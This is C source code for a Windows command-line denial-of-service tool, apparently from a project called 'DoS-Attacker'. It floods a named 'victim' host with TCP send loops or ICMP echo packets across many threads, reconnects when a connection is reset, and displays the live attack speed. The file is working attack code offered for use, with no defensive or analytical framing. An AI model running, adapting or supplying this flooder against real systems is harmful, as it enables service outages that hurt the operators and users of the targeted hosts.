#include <stdio.h>
#include <stdlib.h>
#include <WinSock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <conio.h>
#include <time.h>
#include <stdint.h>

#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

//structures
struct DoSInfo
{
	char* victim;
	char* service;
	addrinfo* hint;
	void* pkg;
	DWORD pkg_size;
	DWORD delay;
};

struct ICMP_Pkt
{
	uint8_t type;		/* message type */
	uint8_t code;		/* type sub-code */
	uint16_t checksum;
	union
	{
		struct
		{
			uint16_t	id;
			uint16_t	sequence;
		} echo;			/* echo datagram */
		uint32_t	gateway;	/* gateway address */
		struct
		{
			uint16_t	__unused;
			uint16_t	mtu;
		} frag;			/* path mtu discovery */
	} un;
};

//functions
void ErrChk(int code, const char* func)
{
	if (code == SOCKET_ERROR)
	{
		printf("Error %u in function %s\n", WSAGetLastError(), func);
		exit(-1);
	}
}

void cls(HANDLE hConsole)
{
	COORD coordScreen = { 0, 0 };    // home for the cursor 
	DWORD cCharsWritten;
	CONSOLE_SCREEN_BUFFER_INFO csbi;
	DWORD dwConSize;

	// Get the number of character cells in the current buffer. 

	if (!GetConsoleScreenBufferInfo(hConsole, &csbi))
	{
		return;
	}

	dwConSize = csbi.dwSize.X * csbi.dwSize.Y;

	// Fill the entire screen with blanks.

	if (!FillConsoleOutputCharacter(hConsole,        // Handle to console screen buffer 
		(TCHAR) ' ',     // Character to write to the buffer
		dwConSize,       // Number of cells to write 
		coordScreen,     // Coordinates of first cell 
		&cCharsWritten))// Receive number of characters written
	{
		return;
	}

	// Get the current text attribute.

	if (!GetConsoleScreenBufferInfo(hConsole, &csbi))
	{
		return;
	}

	// Set the buffer's attributes accordingly.

	if (!FillConsoleOutputAttribute(hConsole,         // Handle to console screen buffer 
		csbi.wAttributes, // Character attributes to use
		dwConSize,        // Number of cells to set attribute 
		coordScreen,      // Coordinates of first cell 
		&cCharsWritten)) // Receive number of characters written
	{
		return;
	}

	// Put the cursor at its home coordinates.

	SetConsoleCursorPosition(hConsole, coordScreen);
}

//global vars for threads
static size_t data = 0, pings = 0;
static UINT exit_code = -1;
static bool run = true, start = false;

DWORD WINAPI DoSThread(LPVOID lParam)
{
	const DoSInfo* info = (DoSInfo*)lParam;
	DWORD res = 0, max_pkg_size = 65536;
	int res_size=sizeof(DWORD);
	long long sent = 0;
	bool keepaliveb = true;
	SOCKET sock = INVALID_SOCKET;
	addrinfo* result;

set:
	//connect
	ErrChk(getaddrinfo(info->victim, info->service, info->hint, &result), "getaddrinfo");
	for (addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next)
	{
		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
		if (sock == INVALID_SOCKET)
		{
			puts("Error in creating socket");
			return -1;
		}
		if (connect(sock, ptr->ai_addr, ptr->ai_addrlen) == SOCKET_ERROR)
		{
			closesocket(sock);
			sock = INVALID_SOCKET;
			continue;
		}
		break;
	}

	if (sock == INVALID_SOCKET)
	{
		puts("Unable to connect to the server.");
		run = false;
		exit(-1);
	}

	//set
	ErrChk(getsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*)& max_pkg_size, &res_size), "getsockopt");
	if (info->pkg_size > max_pkg_size)
	{
		printf("The package size that you have chose is too big...\nThe sockets of this type have a limit of %llu bytes.\n", (unsigned long long)max_pkg_size);
		run = false;
		exit(-1);
	}
	ErrChk(getsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*)& max_pkg_size, &res_size), "getsockopt");
	if (info->pkg_size > max_pkg_size)
	{
		printf("The package size that you have chose is too big...\nThe sockets of this type have a limit of %llu bytes.\n", (unsigned long long)max_pkg_size);
		run = false;
		exit(-1);
	}
	ErrChk(setsockopt(sock, SOL_SOCKET, SO_SNDBUF, (char*) & (info->pkg_size), sizeof(DWORD)), "setsockopt");
	ErrChk(setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (char*) & (info->pkg_size), sizeof(DWORD)), "setsockopt");
	
	//wait...
	while (!start)Sleep(10);//We use Sleep to keep the CPU usage low. If we won't use it, the CPU will probably be at 100%
	//attack!
	while (run)
	{
		data += sent = send(sock, (char*)info->pkg, info->pkg_size, 0);
		pings++;
		if (sent <= 0)
		{
			res = WSAGetLastError();
			switch (res)
			{
			case WSAECONNABORTED:
				puts("\nA WSAECONNABORTED error has occord.\nA software in your PC has closed the connection, or maybe the timeout passed.");
				break;
			case WSAECONNRESET:
				/*
				We try to save the day!
				If the connection is dead, we need to create a new one!
				*/
				run = true;
				goto set;
				break;
			case WSAECONNREFUSED:
				puts("\nA WSAECONNREFUSED error has occord.\nThe remote host refused to the connection.");
				break;
			default:
				printf("\nError \'%u\' has occord.\n", res);
			}
			run = false;
			exit(-1);
		}
		//sleep between packets
		if (info->delay)
			Sleep(info->delay);
	}
	//we must clean at the end
	closesocket(sock);
	return 0;
}

DWORD WINAPI SpeedThread(LPVOID lParam)
{
	HANDLE outh = GetStdHandle(STD_OUTPUT_HANDLE);
	//wait...
	while (!start)Sleep(10);//We use Sleep to keep the CPU usage low. If we won't use it, the CPU will probably be at 100%
	//monitor the attack
	while (run)
	{
		Sleep(1000);
		cls(outh);
		//print the speed
		printf("Attacking: %s\nSpeed rate: %.2fMbps or %.3fMBps\nPings rate: %llu\nPress CTRL+C to stop.", (char*)lParam, (double)data * 8 / 1024 / 1024, (double)data / 1024 / 1024, pings);
		data = 0;
		pings = 0;
	}
	return 0;
}

int main(int argc, char** argv)
{
	//Dos_Attacker target_ip /port port OR /icmp __nothing__ package_size threads delay

	BYTE* buff = NULL;
	//SOCKET sock = INVALID_SOCKET;
	addrinfo victim = { 0 }, * result = NULL;
	WSADATA wsa;
	DWORD delay = 0;
	DWORD pkg_size = 1, max_pkg_size = SO_MAX_MSG_SIZE;
	int res_size=sizeof(DWORD);
	size_t threads_num = 2;
	HANDLE* threads;
	char* port = NULL;
	bool mode_tcp = true;


	if (argc < 4)
	{
		puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
		return 0;
	}

	if (strcmp("/port", argv[2]) == 0 || strcmp("-port", argv[2]) == 0 || strcmp("port", argv[2]) == 0)
	{
		victim.ai_family = AF_UNSPEC;
		victim.ai_socktype = SOCK_STREAM;
		victim.ai_protocol = IPPROTO_TCP;
		if (argc != 7)
		{
			puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
			return 0;
		}
	}
	else if (strcmp("/icmp", argv[2]) == 0 || strcmp("-icmp", argv[2]) == 0 || strcmp("icmp", argv[2]) == 0)
	{
		victim.ai_family = AF_UNSPEC;
		victim.ai_socktype = SOCK_RAW;
		victim.ai_protocol = IPPROTO_ICMP;
		mode_tcp = false;
		if (argc != 6)
		{
			puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
			return 0;
		}
	}
	else
	{
		puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
		return 0;
	}

	if (mode_tcp)port = argv[3];
	pkg_size = strtoul(argv[3 + mode_tcp], NULL, 10);
	if (pkg_size <= 0 || (mode_tcp == false && pkg_size > 65467))
	{
		puts("Invalid package size.\nPackage size should be less than 65467 (when /icmp is used) and nonzero.");
		return -1;
	}

	ErrChk(WSAStartup(MAKEWORD(2, 2), &wsa), "WSAStartup");
	
	buff = (BYTE*)malloc(pkg_size);
	if (!buff)
	{
		puts("Allocation error.");
		return -1;
	}
	if (mode_tcp)
	{
		buff[pkg_size - 1] = 0;
		for (size_t l = 0; l < pkg_size - 1; l++)
		{
			buff[l] = 'A';
		}
	}
	else
	{
		ICMP_Pkt* ipkg = (ICMP_Pkt*)buff;
		if (ipkg == NULL)
		{
			puts("Allocation error.");
			return -1;
		}
		//set the packet
		ipkg->type = 8;
		ipkg->code = 0;
		ipkg->un.echo.sequence = 0;
		ipkg->un.echo.id = 0;
		ipkg->checksum = 0;
		//set the additional data
		for (size_t l = sizeof(ICMP_Pkt); l < pkg_size; l++)
			buff[l] = 'A';
	}

	threads_num = strtoull(argv[4 + mode_tcp], NULL, 10);
	if (!threads_num)
	{
		puts("threads_num must be nonzero.");
		return -1;
	}
	threads = (HANDLE*)malloc((threads_num + 1) * sizeof(HANDLE));
	if (!threads)
	{
		puts("Allocation error.");
		return -1;
	}

	delay = strtoull(argv[5 + mode_tcp], NULL, 10);

	printf("You have chose to attack \'%s:%s\' with a package size of %llu, a total of %llu threads (and sockets) and a delay of %llu.\nContinue? ", argv[1], (mode_tcp) ? port : "ICMP", (unsigned long long)pkg_size, threads_num, (unsigned long long)delay);
	if (getchar() != 'y')return -1;

	//set the args for the threads
	DoSInfo info = { argv[1], (mode_tcp) ? port : NULL, &victim, buff, pkg_size, delay };
	start = false;
	//create the monitoring thread
	threads[0] = CreateThread(NULL, 0, SpeedThread, argv[1], 0, NULL);
	//create the attack threads
	for (size_t l = 1; l < threads_num+1; l++)
	{
		threads[l] = CreateThread(NULL, 0, DoSThread, &info, 0, NULL);
		printf("\r%llu threads have been created.", l);
		if (threads[l] == INVALID_HANDLE_VALUE)
		{
			puts("Error in creating threads...");
			return -1;
		}
	}
	start = true;
	//wait for the CTRL+C
	MSG msg;
	while (GetMessage(&msg,NULL,NULL,NULL))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	//close all the threads
	run = false;
	//wait for the cleanup of the threads
	Sleep(1000);
	//clean up
	WSACleanup();

	return 0;
}